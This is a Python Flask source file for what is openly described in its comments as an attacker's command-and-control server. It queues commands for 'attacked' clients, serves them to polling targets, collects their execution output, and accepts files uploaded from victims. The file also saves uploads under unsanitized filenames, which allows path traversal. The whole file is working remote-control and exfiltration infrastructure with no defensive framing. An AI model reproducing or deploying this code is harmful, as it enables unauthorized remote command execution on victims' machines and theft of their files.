import threading
from flask import Flask, request, jsonify
import os

app = Flask(__name__)

UPLOAD_FOLDER = '/home/Omersaban/uploaded_files'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

commands = {}
outputs = {}


# handling the command that was sended from the attacker to the attacked
@app.route('/send_command', methods=['POST'])
def receive_command():
    data = request.json
    target_client = data['target_client']
    command = data['command']

    commands[target_client] = command
    outputs[target_client] = ""
    print(f"Command sent to {target_client}: {command}")
    return jsonify({"status": "success", "command_received": command}), 200


# client id is for checking if the target is the person you want not for multiple targets!
# getting the command that was sended from the attacker into the attacked side
@app.route('/get_command/<client_id>', methods=['GET'])
def send_command(client_id):
    if client_id in commands:
        command = commands.pop(client_id)
        return jsonify({"command": command}), 200
    else:
        return jsonify({"command": ""}), 200


# what the attacker will get after the command was exected were the staff will be
@app.route('/send_output', methods=['POST'])
def receive_output():
    data = request.json
    client_id = data['client_id']
    output = data['output']

    outputs[client_id] = output
    print(f"Output from {client_id}: {output}")
    return jsonify({"status": "success"}), 200


# getting the output of the attacked to the attacker on attacker side
@app.route('/get_output/<client_id>', methods=['GET'])
def get_output(client_id):
    output = outputs.get(client_id, "")
    return jsonify({"output": output}), 200


# uploading files to the server
@app.route('/upload_file', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({"status": "error", "message": "No file part"}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({"status": "error", "message": "No selected file"}), 400

    file_path = os.path.join(UPLOAD_FOLDER, file.filename)
    file.save(file_path)
    return jsonify({"status": "success", "message": f"File {file.filename} uploaded successfully."}), 200


def run_flask_app():
    app.run(host='0.0.0.0', port=5000)


if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask_app)
    flask_thread.daemon = True
    flask_thread.start()
    flask_thread.join()
